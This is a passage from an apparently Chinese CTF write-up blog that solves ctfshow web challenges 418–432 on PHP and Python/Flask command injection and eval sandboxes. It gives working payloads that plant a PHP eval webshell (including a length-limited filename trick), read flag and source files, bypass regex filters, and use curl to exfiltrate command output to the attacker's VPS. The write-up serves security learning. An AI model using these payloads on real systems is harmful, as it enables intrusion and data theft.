src="https://oss.waynejoons.icu/picphoto/20250821184428179.png"></p><p>由于变量key已经被赋值为0，因此这个后门没什么用，需要另辟蹊径</p><p>然后我们可以看到有个<code>extract</code>函数，这是PHP里的一个函数调用。<code>extract()</code>作用是把数组里的键名当作变量名，在当前作用域创建同名变量，并赋值为数组的对应值。比如<code>$_POST[&#39;wayne&#39;]=123</code>时，<code>extract($_POST);</code>之后就有了变量<code>$wayne=123</code></p><p>我们看这个代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$die</span>?<span class="keyword">die</span>(<span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>):<span class="title function_ invoke__">clear</span>(<span class="variable">$clear</span>);</span><br></pre></td></tr></table></figure><p>由于变量die没有被赋值，因此可以进行<strong>变量覆盖</strong>。这是<strong>三目运算符</strong>，我们可以传入0来触发后面的<code>clear($clear)</code></p><p>继续往下划，可以看到<code>clear</code>函数的定义</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821190543737.png"></p><p>给变量clear用<strong>分号截断命令</strong>即可，POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">die=0&amp;clear=;echo &#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;&gt;/var/www/html/1.php</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250821191346821.png"></p><p>然后蚁剑连接</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821191130558.png"></p><p>在网页根目录找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821191204131.png"></p><h3 id="web419"><a href="#web419" class="headerlink" title="web419"></a>web419</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821210215038.png"></p><p>这题要求<strong>POST</strong>传入参数code，且长度要小于17，然后eval执行php代码</p><p>咱们用<strong>反引号</strong>执行命令即可，把当前目录下的<code>flag.php</code>复制到<code>1.txt</code></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=`cp f* 1.txt`;</span><br></pre></td></tr></table></figure><p>然后打开<code>1.txt</code>读取flag即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821210814466.png"></p><h3 id="web420"><a href="#web420" class="headerlink" title="web420"></a>web420</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821213447055.png"></p><p>这次code长度被限制在8位以内，也就是7位，然后eval函数也换成了system。有几个方法可以做这题</p><p><strong>方法一：nl输出</strong></p><p>nl命令是Linux系统中的一个命令行工具，全称是“number lines”，用于给文本文件或标准输入的每一行添加行号，<strong>并将结果输出</strong>。它类似于cat -n，但nl对行号显示格式和处理方式更灵活</p><p>经过尝试，发现flag在<code>/var/www</code>目录里面</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=nl ../*</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250821213744417.png"></p><p><strong>方法二：写文件并执行</strong></p><p>非常妙的一个方法，强烈建议学习，参考文章：<a href="https://www.cnblogs.com/-chenxs/p/11981586.html">命令注入长度限制绕过</a></p><p>假设我们要写入webshell</p><p>目标是传入<code>echo PD89ZXZhbCgkX1BPU1RbMV0pOw==|base64 -d&gt;1.php;</code></p><p>先用<strong>重定向符</strong>创建文件，依次执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt;hp\;</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\-\\</span><br><span class="line">&gt;4\ \\</span><br><span class="line">&gt;e6\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;=\|\\</span><br><span class="line">&gt;w=\\</span><br><span class="line">&gt;0pO\\</span><br><span class="line">&gt;bMV\\</span><br><span class="line">&gt;U1R\\</span><br><span class="line">&gt;1BP\\</span><br><span class="line">&gt;gkX\\</span><br><span class="line">&gt;hbC\\</span><br><span class="line">&gt;ZXZ\\</span><br><span class="line">&gt;PD89\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br></pre></td></tr></table></figure><p>然后把这些文件名以<strong>时间倒序</strong>形式写入任意一个文件，例如0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -t&gt;0</span><br></pre></td></tr></table></figure><p>最后运行文件即可，会执行0里面的命令，然后在当前目录创建一个<code>1.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh 0</span><br></pre></td></tr></table></figure><p>连接蚁剑即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821224320607.png"></p><p>成功找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821224400535.png"></p><h3 id="web421"><a href="#web421" class="headerlink" title="web421"></a>web421</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821233704196.png"></p><p>这次是要求code长度小于6，也就是长度为5</p><p>经过测试，发现flag就在当前目录。直接<code>nl</code>读取就可以</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=nl f*</span><br></pre></td></tr></table></figure><p>然后打开源代码查看flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821233821138.png"></p><h3 id="web422"><a href="#web422" class="headerlink" title="web422"></a>web422</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250822000032238.png"></p><p>相比上题，这题的code长度被限制在5以内</p><p>直接<code>nl</code>打印全部内容即可</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=nl *</span><br></pre></td></tr></table></figure><p>然后查看网页源码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250822000119903.png"></p><h3 id="web423"><a href="#web423" class="headerlink" title="web423"></a>web423</h3><p>打开源代码，可以看到提示</p><p><img src="https://oss.waynejoons.icu/picphoto/20250822105219034.png"></p><p>拼接code参数，一开始用PHP和直接执行命令都不行。经过测试，这个网站是python文件运行的，要用python代码执行</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=os.popen(&#x27;ls&#x27;).read()</span><br></pre></td></tr></table></figure><p>可以把原始代码打印出来看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=os.popen(&#x27;cat app.py&#x27;).read()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"></span><br><span class="line">app = Flask(__name__) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">code = request.args.get(<span class="string">&#x27;code&#x27;</span>) </span><br><span class="line"><span class="keyword">if</span> code: </span><br><span class="line"><span class="keyword">return</span> <span class="built_in">eval</span>(code) </span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>: </span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>执行命令获取flag即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=os.popen(&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250822105922009.png"></p><h3 id="web424"><a href="#web424" class="headerlink" title="web424"></a>web424</h3><p>这题用<code>?code=os.popen(&#39;ls&#39;).read()</code>会报内部错误，既然执行命令不可以，我们试试直接用open函数读取文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=open(&#x27;app.py&#x27;).read()</span><br></pre></td></tr></table></figure><p>成功执行，得到网页源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>可以看到，这次没有了os模块，没办法执行系统命令了，不过不影响我们读取文件</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><p>成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250822110555816.png"></p><h3 id="web425"><a href="#web425" class="headerlink" title="web425"></a>web425</h3><p>跟上题一样，先读取源代码看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=open(&#x27;app.py&#x27;).read()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>可以看到这题相比上题，<strong>过滤了code里面的os字符串</strong>，其他都是一样的，不影响我们做题</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250822111723746.png"></p><h3 id="web426"><a href="#web426" class="headerlink" title="web426"></a>web426</h3><p>上题的payload也能用，先看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=open(&#x27;app.py&#x27;).read()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>这题的正则匹配改了，简单解释一下</p><ul><li><code>re.compile(r&#39;os|popen&#39;)</code> 创建了一个模式，表示“匹配 <code>os</code> 或 <code>popen</code>”</li><li>竖线 <code>|</code> 是“或”的意思</li><li><code>reg.match(code)</code> 表示只从字符串开头匹配：<ul><li>如果字符串开头含 <code>os</code> 或 <code>popen</code>，匹配成功</li><li>否则匹配失败（即 <code>None</code>）</li></ul></li></ul><p>也就是<strong>开头不能包含os和popen</strong>，不过对我们影响不大</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><h3 id="web427"><a href="#web427" class="headerlink" title="web427"></a>web427</h3><p>可以继续用上题的payload，先看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=open(&#x27;app.py&#x27;).read()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen|system&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>这题比上题<strong>多过滤了system</strong>，不影响做题</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><h3 id="web428"><a href="#web428" class="headerlink" title="web428"></a>web428</h3><p>可以继续用上题的payload看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=open(&#x27;app.py&#x27;).read()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen|system|read&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>这题比上题<strong>多过滤了read</strong>，不过因为<code>reg.match(code)</code>匹配的是<strong>开头</strong>，所以对我们没有影响</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><h3 id="web429"><a href="#web429" class="headerlink" title="web429"></a>web429</h3><p>这题一开始用<code>open(&#39;app.py&#39;).read()</code>执行不了，猜测是某个地方被过滤了，经过尝试，在前面加个空格即可绕过限制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code= open(&#x27;app.py&#x27;).read()</span><br></pre></td></tr></table></figure><p>源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>可以看到，这题过滤了open字符串，因为<code>re.match()</code> 是<strong>从字符串开头匹配</strong>，所以我们在前面加个空格即可绕过</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code= open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><h3 id="web430"><a href="#web430" class="headerlink" title="web430"></a>web430</h3><p>可以用上题的payload，先看源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code= open(&#x27;app.py&#x27;).read()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>这题把eval也过滤了，不过对我们没影响</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code= open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><h3 id="web431"><a href="#web431" class="headerlink" title="web431"></a>web431</h3><p>继续用上题的方法做就好，看看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code= open(&#x27;app.py&#x27;).read()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|str&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>这次多过滤了str，不影响做题</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code= open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><h3 id="web432"><a href="#web432" class="headerlink" title="web432"></a>web432</h3><p>这题用不了之前的方法了，看了网上其他师傅的做法，可以用类似SSTI模板注入的方法来做，构造一条命令执行的链子</p><p>由于<code>os.system()</code>不会把命令的输出结果返回给 Python 程序，所以我们用<strong>curl外带数据</strong>显示</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(__builtins__.__dict__[&#x27;__impo&#x27;%2b&#x27;rt__&#x27;](&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;syste&#x27;%2b&#x27;m&#x27;)(&#x27;curl http://你的vps地址:端口?p=`ls`&#x27;))</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250822163852721.png"></p><p>简单解释里面的一些代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&#x27;__impo&#x27;%2b&#x27;rt__&#x27;](&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;syste&#x27;%2b&#x27;m&#x27;)</span><br></pre></td></tr></table></figure><ul><li><p><code>__builtins__</code>：是 Python 的一个内置模块，包含了所有内建函数和对象（如 <code>print</code>, <code>str</code>, <code>dict</code> 等）。它在任何 Python 代码中都可以直接访问</p></li><li><p><code>__dict__</code>：这是 Python 对象的一个特殊属性，它是一个<strong>字典（dict）</strong>，存储了该对象（这里是 <code>__builtins__</code> 模块）的所有属性。键是属性名，值是属性本身</p></li><li><p><code>__builtins__.__dict__[&#39;__import__&#39;]</code>：这部分代码通过字典键值查询的方式，从 <code>__builtins__</code> 模块中获取了内建函数 <code>__import__</code>。这和直接写 <code>__import__</code> 是一样的，但更隐蔽</p></li><li><p><code>__getattribute__</code>：是 Python 对象的一个方法，用于获取对象的属性。<code>os.__getattribute__(&#39;system&#39;)</code> 的效果和 <code>os.system</code> 完全一样</p></li></ul><p><strong>%2b表示+号</strong>，目的是为了绕过正则匹配限制</p><p>我们可以通过curl把<code>app.py</code>内容转为base64编码外带到vps显示</p><figure class="highlight plaintext"><table><tr><td 